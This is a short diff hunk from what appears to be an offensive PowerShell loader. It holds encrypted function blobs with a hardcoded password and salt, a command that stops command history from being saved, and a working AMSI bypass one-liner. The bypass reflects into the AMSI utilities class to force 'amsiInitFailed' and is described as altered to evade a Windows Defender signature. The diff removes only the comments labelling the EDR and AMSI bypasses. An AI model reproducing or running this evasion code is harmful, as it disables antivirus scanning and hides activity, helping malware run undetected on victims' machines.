@@ -3,10 +3,8 @@ $EncFunc1 = ("sqh1DA1NzoBP0o2XlWFsAA==", "K1NbjkpEDUIolV7WZqcmy4Ez0YKnXXEchJT1Qh
 $EncryptedFunctions = @($EncFunc0,$EncFunc1)
 $Password="z>KjuiLtau"
 $Salt="gzH3o?7cmJ"
-#EDR Bypass
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 
-#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
 (([Ref].Assembly.gettypes() | where {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
 
 #AMSI Bypass 2
